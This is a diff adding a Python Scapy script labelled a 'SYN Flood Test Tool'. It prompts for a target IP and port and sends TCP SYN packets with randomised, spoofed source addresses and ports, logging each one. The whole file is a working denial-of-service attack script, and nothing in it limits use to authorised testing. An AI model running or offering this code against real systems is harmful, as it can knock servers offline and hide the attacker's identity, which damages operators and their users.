@@ -1,0 +1,75 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+from scapy.all import *
+import time
+import random
+import sys
+
+def random_ip():
+    """Generate a random IP address."""
+    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+
+def random_port():
+    """Generate a random port number."""
+    return random.randint(1024, 65535)
+
+def syn_flood(target_ip, target_port, packet_count, delay):
+    """
+    Perform SYN Flood attack.
+    
+    Args:
+        target_ip (str): Target IP address.
+        target_port (int): Target port number.
+        packet_count (int): Number of packets to send.
+        delay (float): Delay between packets.
+    """
+    print(f"\n[INFO] Starting SYN Flood attack on {target_ip}:{target_port}...\n")
+    total_packets = 0
+
+    try:
+        for i in range(packet_count):
+            # Generate random source IP and port
+            src_ip = random_ip()
+            src_port = random_port()
+
+            # Create IP and TCP packets
+            ip_packet = IP(src=src_ip, dst=target_ip)
+            tcp_packet = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))
+
+            # Send the packet
+            send(ip_packet / tcp_packet, verbose=False)
+            total_packets += 1
+
+            print(f"[INFO] Packet {i + 1}/{packet_count} sent: {src_ip}:{src_port} → {target_ip}:{target_port}")
+            time.sleep(delay)
+
+        print(f"\n[INFO] SYN Flood attack completed. Total packets sent: {total_packets}")
+
+    except Exception as e:
+        print(f"[ERROR] An error occurred: {e}")
+
+def main():
+    print("=== SYN Flood Test Tool ===")
+
+    # Input target details
+    try:
+        target_ip = input("Enter Target IP (e.g., 192.168.0.1): ").strip()
+        target_port = int(input("Enter Target Port (e.g., 80): ").strip())
+        packet_count = int(input("Enter number of packets to send (default: 10): ").strip() or 10)
+        delay = float(input("Enter delay between packets in seconds (default: 0.5): ").strip() or 0.5)
+
+        # Validate IP and port
+        if not (0 < target_port <= 65535):
+            print("[ERROR] Invalid port number. Please enter a port between 1 and 65535.")
+            sys.exit(1)
+
+        syn_flood(target_ip, target_port, packet_count, delay)
+
+    except ValueError:
+        print("[ERROR] Invalid input. Please enter valid numbers for port, packet count, and delay.")
+    except KeyboardInterrupt:
+        print("\n[INFO] User interrupted the program. Exiting...")
+
+if __name__ == "__main__":
+    main()
